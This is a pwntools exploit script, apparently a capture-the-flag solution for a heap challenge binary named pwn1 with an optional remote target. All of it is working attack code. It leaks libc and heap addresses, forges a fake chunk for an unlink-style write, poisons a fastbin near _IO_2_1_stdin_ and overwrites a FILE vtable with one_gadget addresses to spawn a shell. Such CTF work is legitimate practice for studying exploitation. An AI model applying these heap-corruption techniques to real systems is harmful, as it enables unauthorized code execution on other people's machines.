#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './pwn1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.23.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)


def eat():
    p.recvuntil('> ')

def add(size, con):
    eat()
    p.sendline('1')
    p.recvuntil('size:\n')
    p.sendline(str(size))
    p.recvuntil('content:\n')
    p.send(con)

def dele(idx):
    eat()
    p.sendline('2')
    p.recvuntil('index:\n')
    p.sendline(str(idx))

def show(idx):
    eat()
    p.sendline('3')
    p.recvuntil('index:\n')
    p.sendline(str(idx))

def edit(addr):
    eat()
    p.sendline('4')
    p.recvuntil('addr:\n')
    p.sendline(str(addr))

add(0x90,'1')#* 0
add(0x90,'1')#* 1
add(0x90,'1')#* 2

dele(0)
add(0x90, '1')#* 0
show(0)
libc.address = u64(p.recv(6).ljust(8,b'\x00'))-0x3c4b31
log.success("libc.address: "+hex(libc.address))


add(0x50,'1')#* 3
add(0x50,'1')#* 4
dele(3)
dele(4)

add(0x50,'1')#* 3
show(3)
heapbase = u64(p.recv(6).ljust(8, b"\x00"))-0x1131
log.success("heapbase: "+hex(heapbase))
_IO_list_all = libc.symbols['_IO_list_all']
log.success("_IO_list_all: "+hex(_IO_list_all))
system = libc.symbols['system']
log.success("system: "+hex(system))
_IO_2_1_stdin_ = libc.sym['_IO_2_1_stdin_']
log.success("_IO_2_1_stdin_: "+hex(_IO_2_1_stdin_))

add(0x78,b'a')#* 4
add(0xf0,'1')#* 5
add(0x60,'1')#* 6

dele(4)
heap_addr = heapbase+0x12c0
ptr = heapbase+0x12e0
fd = ptr-0x18
bk = ptr-0x10
add(0x78,p64(0)+ p64(0x71) + p64(fd) + p64(bk) + p64(heap_addr) + b'a'*0x48 + p64(0x70))#* 4

dele(5)

add(0x60, '1')#* 5
dele(5)


dele(4)
add(0x70, p64(0)+p64(0x71)+p64(_IO_2_1_stdin_+0x9d)+b'\n')# 4

one_array = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadgets = one_array[2] + libc.address

add(0x60, p64(one_gadgets)*12)# 6
vtable_addr = 0x12d0 + heapbase

# add(0x60, '1')# 7

add(0x60, p64(0)*2 + 3*b'\x00' + p32(0xffffffff) + 20*b'\x00' + p64(vtable_addr))# 7
debug()



p.interactive()
